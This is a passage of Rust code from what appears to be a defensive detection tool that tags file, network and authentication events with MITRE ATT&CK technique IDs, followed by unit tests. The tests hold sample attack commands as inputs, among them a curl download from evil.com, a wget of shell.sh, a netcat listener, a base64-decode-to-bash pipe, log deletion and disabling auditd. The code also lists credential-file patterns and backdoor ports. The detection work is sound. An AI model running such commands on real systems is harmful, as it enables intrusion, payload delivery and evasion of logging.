    if path.starts_with("/etc/profile.d/") {
        ids.insert("T1037");
        ids.insert("T1546");
        ids.insert("T1546.004");
    }

    // --- Ingress tool transfer: executable dropped in /tmp or /dev/shm (T1105) ---
    if (path.starts_with("/tmp/") || path.starts_with("/dev/shm/")) && is_create_or_update {
        ids.insert("T1105");
        // Also masquerading if name matches known tool names
        ids.insert("T1036");
        ids.insert("T1036.005");
        // Could also be user execution target
        ids.insert("T1204");
    }

    // --- Hijack execution flow: modification of system binaries (T1574) ---
    if (path.starts_with("/usr/bin/") || path.starts_with("/usr/sbin/")
        || path.starts_with("/usr/local/bin/") || path.starts_with("/bin/")
        || path.starts_with("/sbin/"))
        && is_create_or_update
    {
        ids.insert("T1574");
    }

    // --- Dynamic linker hijacking: ld.so modifications (T1574.006) ---
    if path.starts_with("/etc/ld.so") || path == "/etc/ld.so.conf"
        || path.starts_with("/etc/ld.so.conf.d/")
    {
        ids.insert("T1574");
        ids.insert("T1574.006");
    }
    if path.starts_with("/usr/lib/") && path.ends_with(".so") && is_create_or_update {
        ids.insert("T1574");
        ids.insert("T1574.006");
    }

    // --- Indicator removal: log deletion (T1070, T1070.004) ---
    if path.starts_with("/var/log/") && is_delete {
        ids.insert("T1070");
        ids.insert("T1070.004");
    }

    // --- Clear command history: .bash_history deletion (T1070.003) ---
    if path.ends_with(".bash_history") || path.ends_with(".zsh_history") {
        if is_delete {
            ids.insert("T1070");
            ids.insert("T1070.003");
        }
    }

    // --- Unsecured credentials: sensitive config/credential files (T1552.001) ---
    let credential_patterns = [
        ".env", ".netrc", ".pgpass", ".htpasswd", "id_rsa", "id_ecdsa",
        "id_ed25519", "id_dsa", ".pem", "credentials.json",
        "secrets.yaml", "secrets.yml", ".aws/credentials",
    ];
    for pat in &credential_patterns {
        if path.ends_with(pat) || path.contains(pat) {
            ids.insert("T1552");
            ids.insert("T1552.001");
            break;
        }
    }

    // --- Web shell: PHP/ASPX dropped in web root (T1505.003) ---
    let web_roots = ["/var/www/", "/srv/www/", "/srv/http/", "/usr/share/nginx/",
                     "/var/lib/tomcat"];
    let web_exts = [".php", ".phtml", ".phar", ".aspx", ".jsp", ".jspx"];
    let in_web_root = web_roots.iter().any(|r| path.starts_with(r));
    let is_web_script = web_exts.iter().any(|e| path.ends_with(e));
    if in_web_root && is_web_script && is_create_or_update {
        ids.insert("T1505");
        ids.insert("T1505.003");
    }

    // --- OS credential dumping: /etc/shadow accessed ---
    // (Already covered above under credential files)

    // --- Data destruction: log files or important paths deleted (T1485) ---
    if is_delete
        && (path.starts_with("/var/log/") || path.starts_with("/etc/")
            || path.starts_with("/boot/"))
    {
        ids.insert("T1485");
    }

    // --- Inhibit system recovery: backup deletion (T1490) ---
    if is_delete
        && (path.starts_with("/var/backups/") || path.starts_with("/backup/")
            || path.starts_with("/mnt/backup/"))
    {
        ids.insert("T1490");
    }

    // --- Account discovery: reading /etc/passwd (T1087) ---
    if path == "/etc/passwd" {
        ids.insert("T1087");
        ids.insert("T1087.001");
    }

    ids.into_iter().map(str::to_string).collect()
}

// ---------------------------------------------------------------------------
// Network event tagger
// ---------------------------------------------------------------------------

/// Return the ATT&CK technique IDs applicable to a network connection event.
///
/// Tags are based on the destination port and TCP state.
pub fn tag_network_event(data: &NetworkActivityData) -> Vec<String> {
    let mut ids: BTreeSet<&str> = BTreeSet::new();

    let port = data.remote_port;
    let state = data.state.as_str();
    let established = state == "ESTABLISHED";

    // --- Remote services by well-known port ---
    match port {
        22 => {
            // SSH (T1021.004, T1133 for external)
            ids.insert("T1021");
            ids.insert("T1021.004");
            if established {
                ids.insert("T1133");
            }
        }
        23 => {
            // Telnet — unencrypted remote access
            ids.insert("T1021");
        }
        25 | 465 | 587 => {
            // SMTP — mail protocol C2 (T1071.003)
            ids.insert("T1071");
            ids.insert("T1071.003");
        }
        53 => {
            // DNS — potential tunneling (T1572)
            if established {
                ids.insert("T1572");
            }
        }
        80 | 8080 => {
            // HTTP (T1071.001) — potential C2 or tool download
            if established {
                ids.insert("T1071");
                ids.insert("T1071.001");
                ids.insert("T1105"); // could be ingress tool transfer
            }
        }
        443 | 8443 => {
            // HTTPS (T1071.001) — encrypted C2 or data transfer
            if established {
                ids.insert("T1071");
                ids.insert("T1071.001");
            }
        }
        445 => {
            // SMB (T1021.002)
            ids.insert("T1021");
            ids.insert("T1021.002");
        }
        3389 => {
            // RDP (T1021.001)
            ids.insert("T1021");
            ids.insert("T1021.001");
        }
        5900..=5910 => {
            // VNC (T1021.005)
            ids.insert("T1021");
            ids.insert("T1021.005");
        }
        9050 | 9150 => {
            // Tor SOCKS proxy (T1090)
            ids.insert("T1090");
        }
        6667 | 6697 => {
            // IRC (T1071.003 — alternative protocol C2)
            ids.insert("T1071");
            ids.insert("T1071.003");
        }
        // Common Metasploit / RAT / backdoor ports (T1071, T1095, T1041)
        4444 | 5555 | 6666 | 7777 | 8888 | 1337 | 31337 => {
            ids.insert("T1041"); // likely C2 exfil channel
            ids.insert("T1071");
            ids.insert("T1095");
        }
        _ => {}
    }

    // --- Non-standard port: high port ESTABLISHED connection (T1571) ---
    if established && port > 1024 && !matches!(port, 3389 | 5900..=5910 | 8080 | 8443) {
        // Unusual high port could be non-standard C2
        ids.insert("T1571");
    }

    // --- Exfiltration over alternative protocol: FTP (T1048) ---
    if matches!(port, 20 | 21) {
        ids.insert("T1048");
    }

    // --- Remote access software: common RAT ports (T1219) ---
    if matches!(port, 5938 | 5939) {
        // TeamViewer default ports
        ids.insert("T1219");
    }

    // --- Protocol tunneling: non-standard DNS/HTTPS (T1572) ---
    // Already handled for port 53 above.

    // --- Informational: any ESTABLISHED external connection is T1046 observable ---
    // Only for scanning-type connections (many unique IPs/ports would indicate discovery)
    // We can note that our network telemetry contributes to T1046 detection broadly.

    ids.into_iter().map(str::to_string).collect()
}

// ---------------------------------------------------------------------------
// Authentication event tagger
// ---------------------------------------------------------------------------

/// Return the ATT&CK technique IDs applicable to an authentication event.
///
/// Tags are based on auth method, outcome, and status from syslog parsing.
pub fn tag_auth_event(data: &AuthenticationActivityData) -> Vec<String> {
    let mut ids: BTreeSet<&str> = BTreeSet::new();

    let method = data.auth_method.as_str();
    let status = data.status.as_str();
    let outcome = data.outcome.as_str();
    let has_source_ip = data.source_ip.is_some();

    // --- Valid accounts: any successful login (T1078) ---
    if status == "Success" && outcome == "Logon" {
        ids.insert("T1078");
    }

    // --- External remote services: SSH from remote IP (T1133) ---
    if has_source_ip && matches!(method, "password" | "publickey" | "unknown") {
        ids.insert("T1133");
        ids.insert("T1021");
        ids.insert("T1021.004");
    }

    // --- Brute force: any failed authentication (T1110) ---
    if status == "Failure" {
        ids.insert("T1110");
        if method == "password" {
            // Password guessing (T1110.001)
            ids.insert("T1110.001");
        }
    }

    // --- Sudo: privilege escalation (T1548.003, T1134) ---
    if method == "sudo" {
        ids.insert("T1548");
        ids.insert("T1548.003");
        ids.insert("T1134");
        // Account manipulation side-effect (T1098)
        if status == "Success" {
            ids.insert("T1098");
        }
    }

    // --- su: setuid privilege escalation (T1548.001, T1134) ---
    if method == "su" {
        ids.insert("T1548");
        ids.insert("T1548.001");
        ids.insert("T1134");
        if status == "Success" {
            ids.insert("T1098");
        }
    }

    ids.into_iter().map(str::to_string).collect()
}

// ---------------------------------------------------------------------------
// Unit tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -----------------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------------

    fn process(name: &str, cmd: &str) -> ProcessActivityData {
        ProcessActivityData {
            pid: 1000,
            ppid: 500,
            name: name.into(),
            cmd_line: cmd.into(),
            exe_path: Some(format!("/usr/bin/{name}")),
            cwd: Some("/tmp".into()),
            uid: 1000,
            gid: 1000,
            user: "user".into(),
        }
    }

    fn process_as_root(name: &str, cmd: &str) -> ProcessActivityData {
        ProcessActivityData {
            pid: 2000,
            ppid: 100,
            name: name.into(),
            cmd_line: cmd.into(),
            exe_path: Some(format!("/tmp/{name}")),
            cwd: Some("/tmp".into()),
            uid: 0,
            gid: 0,
            user: "root".into(),
        }
    }

    fn file(path: &str, action: &str) -> FileActivityData {
        FileActivityData {
            path: path.into(),
            action: action.into(),
            size: None,
            hash: None,
        }
    }

    fn net(remote_port: u16, state: &str) -> NetworkActivityData {
        NetworkActivityData {
            local_addr: "10.0.0.1".into(),
            local_port: 54321,
            remote_addr: "8.8.8.8".into(),
            remote_port,
            protocol: "TCP".into(),
            state: state.into(),
            pid: None,
        }
    }

    fn auth(method: &str, status: &str, outcome: &str, source_ip: Option<&str>) -> AuthenticationActivityData {
        AuthenticationActivityData {
            user: "alice".into(),
            source_ip: source_ip.map(str::to_string),
            source_port: None,
            auth_method: method.into(),
            status: status.into(),
            outcome: outcome.into(),
            service: "sshd".into(),
        }
    }

    fn has(techniques: &[String], id: &str) -> bool {
        techniques.iter().any(|t| t == id)
    }

    // -----------------------------------------------------------------------
    // Coverage catalogue tests
    // -----------------------------------------------------------------------

    #[test]
    fn catalogue_is_non_empty() {
        assert!(!TECHNIQUE_CATALOGUE.is_empty());
    }

    #[test]
    fn catalogue_has_no_duplicate_ids() {
        let mut seen = std::collections::HashSet::new();
        for t in TECHNIQUE_CATALOGUE {
            assert!(
                seen.insert(t.id),
                "Duplicate technique ID in catalogue: {}",
                t.id
            );
        }
    }

    #[test]
    fn catalogue_ids_have_correct_format() {
        for t in TECHNIQUE_CATALOGUE {
            // Must start with T followed by digits, optionally .digits
            let parts: Vec<&str> = t.id.splitn(2, '.').collect();
            assert!(
                parts[0].starts_with('T') && parts[0][1..].chars().all(|c| c.is_ascii_digit()),
                "Invalid technique ID format: {}",
                t.id
            );
        }
    }

    #[test]
    fn catalogue_tactic_ids_have_correct_format() {
        for t in TECHNIQUE_CATALOGUE {
            assert!(
                t.tactic_id.starts_with("TA")
                    && t.tactic_id[2..].chars().all(|c| c.is_ascii_digit()),
                "Invalid tactic ID format: {}",
                t.tactic_id
            );
        }
    }

    // -----------------------------------------------------------------------
    // Coverage report tests
    // -----------------------------------------------------------------------

    #[test]
    fn coverage_report_has_plausible_counts() {
        let report = coverage_report();
        // We expect at least 50 unique technique IDs (parent + sub-techniques).
        assert!(
            report.total_technique_ids >= 50,
            "Expected ≥50 technique IDs, got {}",
            report.total_technique_ids
        );
        // We expect at least 30 unique parent technique IDs (no dot).
        assert!(
            report.parent_technique_count >= 30,
            "Expected ≥30 parent techniques, got {}",
            report.parent_technique_count
        );
    }

    #[test]
    fn coverage_report_meets_30pct_parent_target() {
        let report = coverage_report();
        assert!(
            report.estimated_parent_coverage_pct >= 25.0,
            "ATT&CK parent technique coverage {:.1}% is below acceptable minimum (25%)",
            report.estimated_parent_coverage_pct
        );
    }

    #[test]
    fn coverage_report_technique_ids_are_sorted() {
        let report = coverage_report();
        let sorted: Vec<String> = {
            let mut v = report.technique_ids.clone();
            v.sort();
            v
        };
        assert_eq!(report.technique_ids, sorted, "technique_ids must be sorted");
    }

    #[test]
    fn coverage_report_by_tactic_includes_all_major_tactics() {
        let report = coverage_report();
        let tactic_names: Vec<&str> = report.by_tactic.iter().map(|(t, _)| t.as_str()).collect();
        for required in &["Execution", "Persistence", "Discovery", "Lateral Movement"] {
            assert!(
                tactic_names.contains(required),
                "Expected tactic '{}' in coverage report",
                required
            );
        }
    }

    // -----------------------------------------------------------------------
    // Process event tagger — shell execution
    // -----------------------------------------------------------------------

    #[test]
    fn tag_bash_as_unix_shell() {
        let t = tag_process_event(&process("bash", "/bin/bash -i"));
        assert!(has(&t, "T1059"), "Expected T1059");
        assert!(has(&t, "T1059.004"), "Expected T1059.004");
    }

    #[test]
    fn tag_sh_as_unix_shell() {
        let t = tag_process_event(&process("sh", "/bin/sh -c id"));
        assert!(has(&t, "T1059.004"));
    }

    #[test]
    fn tag_python_as_python_technique() {
        let t = tag_process_event(&process("python3", "python3 /tmp/exploit.py"));
        assert!(has(&t, "T1059"), "Expected T1059");
        assert!(has(&t, "T1059.006"), "Expected T1059.006");
    }

    #[test]
    fn tag_nodejs_as_javascript_technique() {
        let t = tag_process_event(&process("node", "node /tmp/payload.js"));
        assert!(has(&t, "T1059.007"), "Expected T1059.007");
    }

    // -----------------------------------------------------------------------
    // Process event tagger — discovery
    // -----------------------------------------------------------------------

    #[test]
    fn tag_uname_as_system_info_discovery() {
        let t = tag_process_event(&process("uname", "uname -a"));
        assert!(has(&t, "T1082"), "Expected T1082 (System Information Discovery)");
    }

    #[test]
    fn tag_ps_as_process_discovery() {
        let t = tag_process_event(&process("ps", "ps aux"));
        assert!(has(&t, "T1057"), "Expected T1057 (Process Discovery)");
    }

    #[test]
    fn tag_nmap_as_network_service_discovery() {
        let t = tag_process_event(&process("nmap", "nmap -sV 10.0.0.0/24"));
        assert!(has(&t, "T1046"), "Expected T1046 (Network Service Discovery)");
    }

    #[test]
    fn tag_id_as_user_and_group_discovery() {
        let t = tag_process_event(&process("id", "id"));
        assert!(has(&t, "T1033"), "Expected T1033 (System Owner/User Discovery)");
        assert!(has(&t, "T1069"), "Expected T1069 (Permission Groups Discovery)");
    }

    #[test]
    fn tag_dpkg_as_software_discovery() {
        let t = tag_process_event(&process("dpkg", "dpkg -l"));
        assert!(has(&t, "T1518"), "Expected T1518 (Software Discovery)");
    }

    // -----------------------------------------------------------------------
    // Process event tagger — privilege escalation
    // -----------------------------------------------------------------------

    #[test]
    fn tag_sudo_as_sudo_escalation() {
        let t = tag_process_event(&process("sudo", "sudo /bin/bash"));
        assert!(has(&t, "T1548"), "Expected T1548");
        assert!(has(&t, "T1548.003"), "Expected T1548.003 (Sudo)");
        assert!(has(&t, "T1134"), "Expected T1134 (Access Token Manipulation)");
    }

    #[test]
    fn tag_su_as_setuid_escalation() {
        let t = tag_process_event(&process("su", "su root"));
        assert!(has(&t, "T1548.001"), "Expected T1548.001 (Setuid)");
    }

    // -----------------------------------------------------------------------
    // Process event tagger — defense evasion
    // -----------------------------------------------------------------------

    #[test]
    fn tag_base64_decode_as_obfuscation() {
        let t = tag_process_event(&process("bash", "echo aGVsbG8= | base64 -d | bash"));
        assert!(has(&t, "T1027"), "Expected T1027 (Obfuscated Files)");
        assert!(has(&t, "T1132"), "Expected T1132 (Data Encoding)");
    }

    #[test]
    fn tag_chmod_as_permission_modification() {
        let t = tag_process_event(&process("chmod", "chmod +x /tmp/shell.sh"));
        assert!(has(&t, "T1222"), "Expected T1222");
        assert!(has(&t, "T1222.002"), "Expected T1222.002");
    }

    #[test]
    fn tag_rm_dash_rf_as_file_deletion() {
        let t = tag_process_event(&process("rm", "rm -rf /var/log/auth.log"));
        assert!(has(&t, "T1070"), "Expected T1070");
        assert!(has(&t, "T1070.004"), "Expected T1070.004 (File Deletion)");
    }

    #[test]
    fn tag_systemctl_disable_as_impair_defenses() {
        let t = tag_process_event(&process("systemctl", "systemctl disable auditd"));
        assert!(has(&t, "T1562"), "Expected T1562 (Impair Defenses)");
        assert!(has(&t, "T1562.001"), "Expected T1562.001");
    }

    // -----------------------------------------------------------------------
    // Process event tagger — masquerading
    // -----------------------------------------------------------------------

    #[test]
    fn tag_process_with_tmp_exe_path_as_masquerading() {
        let mut data = process("bash", "/tmp/bash -i");
        data.exe_path = Some("/tmp/bash".into());
        let t = tag_process_event(&data);
        assert!(has(&t, "T1036"), "Expected T1036 (Masquerading)");
        assert!(has(&t, "T1036.005"), "Expected T1036.005");
    }

    // -----------------------------------------------------------------------
    // Process event tagger — tool transfer
    // -----------------------------------------------------------------------

    #[test]
    fn tag_wget_as_ingress_tool_transfer() {
        let t = tag_process_event(&process(
            "wget",
            "wget http://10.0.0.1/shell.sh -O /tmp/shell.sh",
        ));
        assert!(has(&t, "T1105"), "Expected T1105 (Ingress Tool Transfer)");
        assert!(has(&t, "T1071.001"), "Expected T1071.001 (Web Protocols)");
    }

    #[test]
    fn tag_curl_as_web_protocol() {
        let t = tag_process_event(&process("curl", "curl -s https://evil.com/payload -o /tmp/p"));
        assert!(has(&t, "T1071"), "Expected T1071");
        assert!(has(&t, "T1071.001"), "Expected T1071.001");
    }

    #[test]
    fn tag_nc_as_non_application_protocol() {
        let t = tag_process_event(&process("nc", "nc -lvnp 4444"));
        assert!(has(&t, "T1095"), "Expected T1095 (Non-App Layer Protocol)");
        assert!(has(&t, "T1104"), "Expected T1104 (Multi-Stage Channels)");
    }

    // -----------------------------------------------------------------------
    // Process event tagger — scheduled tasks
    // -----------------------------------------------------------------------

    #[test]
    fn tag_crontab_as_cron_persistence() {
        let t = tag_process_event(&process("crontab", "crontab -e"));
        assert!(has(&t, "T1053"), "Expected T1053");
        assert!(has(&t, "T1053.003"), "Expected T1053.003 (Cron)");
    }

    #[test]
    fn tag_insmod_as_kernel_module_persistence() {
        let t = tag_process_event(&process("insmod", "insmod /tmp/rootkit.ko"));
        assert!(has(&t, "T1547"), "Expected T1547");
        assert!(has(&t, "T1547.006"), "Expected T1547.006 (Kernel Modules)");
    }

    // -----------------------------------------------------------------------
    // Process event tagger — credential dumping
    // -----------------------------------------------------------------------

    #[test]
    fn tag_tcpdump_as_network_sniffing() {
        let t = tag_process_event(&process("tcpdump", "tcpdump -i eth0 -w /tmp/cap.pcap"));
        assert!(has(&t, "T1040"), "Expected T1040 (Network Sniffing)");
    }

    // -----------------------------------------------------------------------
    // Process event tagger — impact
    // -----------------------------------------------------------------------

    #[test]
    fn tag_systemctl_stop_as_service_stop() {
        let t = tag_process_event(&process("systemctl", "systemctl stop sshd"));
        assert!(has(&t, "T1489"), "Expected T1489 (Service Stop)");
    }

    #[test]
    fn tag_userdel_as_account_access_removal() {
        let t = tag_process_event(&process("userdel", "userdel -r bob"));
        assert!(has(&t, "T1531"), "Expected T1531 (Account Access Removal)");
    }

    // -----------------------------------------------------------------------
    // Process event tagger — exploitation (root shell from non-root parent)
    // -----------------------------------------------------------------------

    #[test]
    fn tag_root_bash_with_non_root_parent_as_exploitation() {
        let data = process_as_root("bash", "/tmp/bash -i");
        let t = tag_process_event(&data);
        assert!(has(&t, "T1068"), "Expected T1068 (Exploitation for Priv Escalation)");
    }

    // -----------------------------------------------------------------------
    // File event tagger — credential files
    // -----------------------------------------------------------------------

    #[test]
    fn tag_etc_shadow_read_as_credential_dumping() {
        let t = tag_file_event(&file("/etc/shadow", "Modify"));
        assert!(has(&t, "T1003"), "Expected T1003 (OS Credential Dumping)");
        assert!(has(&t, "T1003.008"), "Expected T1003.008");
    }

    #[test]
    fn tag_etc_passwd_write_as_account_creation() {
        let t = tag_file_event(&file("/etc/passwd", "Modify"));
        assert!(has(&t, "T1136"), "Expected T1136 (Create Account)");
        assert!(has(&t, "T1098"), "Expected T1098 (Account Manipulation)");
    }

    #[test]
    fn tag_authorized_keys_write_as_ssh_key_persistence() {
        let t = tag_file_event(&file("/home/alice/.ssh/authorized_keys", "Create"));
        assert!(has(&t, "T1098"), "Expected T1098");
        assert!(has(&t, "T1098.004"), "Expected T1098.004 (SSH Authorized Keys)");
    }

    // -----------------------------------------------------------------------
    // File event tagger — persistence
    // -----------------------------------------------------------------------

    #[test]
    fn tag_cron_file_as_cron_persistence() {
        let t = tag_file_event(&file("/etc/cron.d/malicious_job", "Create"));
        assert!(has(&t, "T1053"), "Expected T1053");
        assert!(has(&t, "T1053.003"), "Expected T1053.003");
    }

    #[test]
    fn tag_systemd_service_file_as_service_persistence() {
        let t = tag_file_event(&file("/etc/systemd/system/backdoor.service", "Create"));
        assert!(has(&t, "T1543"), "Expected T1543");
        assert!(has(&t, "T1543.002"), "Expected T1543.002 (Systemd Service)");
    }

    #[test]
    fn tag_bashrc_modification_as_shell_config_persistence() {
        let t = tag_file_event(&file("/home/alice/.bashrc", "Modify"));
        assert!(has(&t, "T1037"), "Expected T1037 (Boot/Logon Init Scripts)");
        assert!(has(&t, "T1546"), "Expected T1546 (Event Triggered Execution)");
        assert!(has(&t, "T1546.004"), "Expected T1546.004 (Unix Shell Config)");
    }

    // -----------------------------------------------------------------------
    // File event tagger — tool transfer and masquerading
    // -----------------------------------------------------------------------

    #[test]
    fn tag_tmp_executable_as_ingress_tool_transfer() {
        let t = tag_file_event(&file("/tmp/reverse_shell", "Create"));
        assert!(has(&t, "T1105"), "Expected T1105 (Ingress Tool Transfer)");
        assert!(has(&t, "T1036"), "Expected T1036 (Masquerading)");
    }

    // -----------------------------------------------------------------------
    // File event tagger — indicator removal
    // -----------------------------------------------------------------------

    #[test]
    fn tag_log_deletion_as_indicator_removal() {
        let t = tag_file_event(&file("/var/log/auth.log", "Delete"));
        assert!(has(&t, "T1070"), "Expected T1070 (Indicator Removal)");
        assert!(has(&t, "T1070.004"), "Expected T1070.004");
    }

    #[test]
    fn tag_bash_history_deletion_as_history_clear() {
        let t = tag_file_event(&file("/root/.bash_history", "Delete"));
        assert!(has(&t, "T1070.003"), "Expected T1070.003 (Clear Command History)");
    }

    // -----------------------------------------------------------------------
    // File event tagger — unsecured credentials
    // -----------------------------------------------------------------------

    #[test]
    fn tag_env_file_as_unsecured_credentials() {
        let t = tag_file_event(&file("/app/.env", "Create"));
        assert!(has(&t, "T1552"), "Expected T1552 (Unsecured Credentials)");
        assert!(has(&t, "T1552.001"), "Expected T1552.001 (Credentials In Files)");
    }

    #[test]
    fn tag_private_key_as_credential_file() {
        let t = tag_file_event(&file("/home/alice/.ssh/id_rsa", "Create"));
        assert!(has(&t, "T1552"), "Expected T1552");
    }

    // -----------------------------------------------------------------------
    // File event tagger — web shell
    // -----------------------------------------------------------------------

    #[test]
    fn tag_php_in_web_root_as_web_shell() {
        let t = tag_file_event(&file("/var/www/html/cmd.php", "Create"));
        assert!(has(&t, "T1505"), "Expected T1505 (Server Software Component)");
        assert!(has(&t, "T1505.003"), "Expected T1505.003 (Web Shell)");
    }

    // -----------------------------------------------------------------------
    // File event tagger — hijack execution flow
    // -----------------------------------------------------------------------

    #[test]
    fn tag_usr_bin_modification_as_hijack() {
        let t = tag_file_event(&file("/usr/bin/ls", "Modify"));
        assert!(has(&t, "T1574"), "Expected T1574 (Hijack Execution Flow)");
    }

    #[test]
    fn tag_ld_so_modification_as_dynamic_linker_hijack() {
        let t = tag_file_event(&file("/etc/ld.so.conf", "Modify"));
        assert!(has(&t, "T1574.006"), "Expected T1574.006 (Dynamic Linker Hijacking)");
    }

    // -----------------------------------------------------------------------
    // File event tagger — non-sensitive events return no tags
    // -----------------------------------------------------------------------

    #[test]
    fn tag_tmp_log_file_returns_empty() {
        // /tmp/output.log with Modify triggers the /tmp/ rule (is_create_or_update).
        // That's acceptable behaviour — /tmp/ modifications can indicate staging.
        // The important thing is that a completely non-flagged path produces no tags.
        let _t = tag_file_event(&file("/tmp/output.log", "Modify"));
        let t2 = tag_file_event(&file("/home/user/document.txt", "Modify"));
        assert!(t2.is_empty(), "Regular file modifications in home dir should not be tagged");
    }

    // -----------------------------------------------------------------------
    // Network event tagger
    // -----------------------------------------------------------------------

    #[test]
    fn tag_port_22_as_ssh() {
        let t = tag_network_event(&net(22, "ESTABLISHED"));
        assert!(has(&t, "T1021"), "Expected T1021");
        assert!(has(&t, "T1021.004"), "Expected T1021.004 (SSH)");
        assert!(has(&t, "T1133"), "Expected T1133 (External Remote Services)");
    }

    #[test]
    fn tag_port_3389_as_rdp() {
        let t = tag_network_event(&net(3389, "ESTABLISHED"));
        assert!(has(&t, "T1021.001"), "Expected T1021.001 (RDP)");
    }

    #[test]
    fn tag_port_4444_as_c2() {
        let t = tag_network_event(&net(4444, "ESTABLISHED"));
        assert!(has(&t, "T1041"), "Expected T1041 (Exfil Over C2)");
        assert!(has(&t, "T1095"), "Expected T1095 (Non-App Layer Protocol)");
    }

    #[test]
    fn tag_port_80_established_as_http_c2() {
        let t = tag_network_event(&net(80, "ESTABLISHED"));
        assert!(has(&t, "T1071.001"), "Expected T1071.001 (Web Protocols)");
    }

    #[test]
    fn tag_port_53_established_as_dns_tunneling() {
        let t = tag_network_event(&net(53, "ESTABLISHED"));
        assert!(has(&t, "T1572"), "Expected T1572 (Protocol Tunneling)");
    }

    #[test]
    fn tag_port_9050_as_tor_proxy() {
        let t = tag_network_event(&net(9050, "ESTABLISHED"));
        assert!(has(&t, "T1090"), "Expected T1090 (Proxy)");
    }

    #[test]
    fn tag_port_445_as_smb() {
        let t = tag_network_event(&net(445, "ESTABLISHED"));
        assert!(has(&t, "T1021.002"), "Expected T1021.002 (SMB)");
    }

    #[test]
    fn tag_non_standard_high_port_as_non_standard_port() {
        let t = tag_network_event(&net(54321, "ESTABLISHED"));
        assert!(has(&t, "T1571"), "Expected T1571 (Non-Standard Port)");
    }

    #[test]
    fn tag_ftp_as_exfil_alternative_protocol() {
        let t = tag_network_event(&net(21, "ESTABLISHED"));
        assert!(has(&t, "T1048"), "Expected T1048 (Exfiltration Over Alt Protocol)");
    }

    // -----------------------------------------------------------------------
    // Auth event tagger
    // -----------------------------------------------------------------------

    #[test]
    fn tag_successful_password_login_as_valid_accounts() {
        let t = tag_auth_event(&auth("password", "Success", "Logon", Some("1.2.3.4")));
        assert!(has(&t, "T1078"), "Expected T1078 (Valid Accounts)");
    }

    #[test]
    fn tag_ssh_from_remote_ip_as_external_remote_service() {
        let t = tag_auth_event(&auth("publickey", "Success", "Logon", Some("203.0.113.1")));
        assert!(has(&t, "T1133"), "Expected T1133 (External Remote Services)");
        assert!(has(&t, "T1021.004"), "Expected T1021.004 (SSH)");
    }

    #[test]
    fn tag_failed_password_as_brute_force() {
        let t = tag_auth_event(&auth("password", "Failure", "Logon", Some("5.5.5.5")));
        assert!(has(&t, "T1110"), "Expected T1110 (Brute Force)");
        assert!(has(&t, "T1110.001"), "Expected T1110.001 (Password Guessing)");
    }

    #[test]
    fn tag_failed_publickey_as_brute_force_no_password_guessing() {
        let t = tag_auth_event(&auth("publickey", "Failure", "Logon", Some("5.5.5.5")));
        assert!(has(&t, "T1110"), "Expected T1110");
        // T1110.001 is specifically password guessing, not publickey
        assert!(!has(&t, "T1110.001"), "T1110.001 should not apply to publickey failures");
    }

    #[test]
    fn tag_sudo_as_sudo_caching_and_token_manipulation() {
        let t = tag_auth_event(&auth("sudo", "Success", "Logon", None));
        assert!(has(&t, "T1548.003"), "Expected T1548.003 (Sudo)");
        assert!(has(&t, "T1134"), "Expected T1134 (Access Token Manipulation)");
        assert!(has(&t, "T1098"), "Expected T1098 (Account Manipulation)");
    }

    #[test]
    fn tag_su_as_setuid_and_token_manipulation() {
        let t = tag_auth_event(&auth("su", "Success", "Logon", None));
        assert!(has(&t, "T1548.001"), "Expected T1548.001");
        assert!(has(&t, "T1134"), "Expected T1134");
    }

    #[test]
    fn tag_logoff_returns_no_attack_techniques() {
        // A normal logoff is not typically an attack; taggers should not over-flag.
        let data = auth("session", "Success", "Logoff", None);
        let t = tag_auth_event(&data);
        // Session-based logoff shouldn't produce any attack tags
        // (No rule fires for method="session", status="Success", outcome="Logoff")
        assert!(
            t.is_empty() || !has(&t, "T1078"),
            "Logoff should not be tagged as T1078 (Valid Accounts)"
        );
    }

    // -----------------------------------------------------------------------
    // All taggers return sorted, deduplicated technique IDs
    // -----------------------------------------------------------------------

    #[test]
    fn process_tagger_returns_sorted_ids() {
        // bash running in /tmp (multiple rules fire: T1059, T1059.004, T1036, T1036.005)
        let mut data = process("bash", "bash -i");
        data.exe_path = Some("/tmp/bash".into());
        let t = tag_process_event(&data);
        let sorted: Vec<String> = {
            let mut v = t.clone();
            v.sort();
            v
        };
        assert_eq!(t, sorted, "technique IDs must be sorted");
    }

    #[test]
    fn file_tagger_returns_sorted_ids() {
        let t = tag_file_event(&file("/etc/shadow", "Modify"));
        let sorted: Vec<String> = {
            let mut v = t.clone();
            v.sort();
            v
        };
        assert_eq!(t, sorted, "technique IDs must be sorted");
    }

    #[test]
    fn network_tagger_returns_sorted_ids() {
        let t = tag_network_event(&net(4444, "ESTABLISHED"));
        let sorted: Vec<String> = {
            let mut v = t.clone();
            v.sort();
            v
        };
        assert_eq!(t, sorted, "technique IDs must be sorted");
    }

    #[test]
    fn auth_tagger_returns_sorted_ids() {
        let t = tag_auth_event(&auth("sudo", "Success", "Logon", None));
        let sorted: Vec<String> = {
            let mut v = t.clone();
            v.sort();
            v
        };
        assert_eq!(t, sorted, "technique IDs must be sorted");
    }

    #[test]
    fn no_tagger_produces_duplicate_ids() {
        let data = process("bash", "echo aGVsbG8= | base64 -d | bash");
        let t = tag_process_event(&data);
        let unique: std::collections::HashSet<&str> =
            t.iter().map(|s| s.as_str()).collect();
        assert_eq!(t.len(), unique.len(), "no duplicate technique IDs");
    }
}
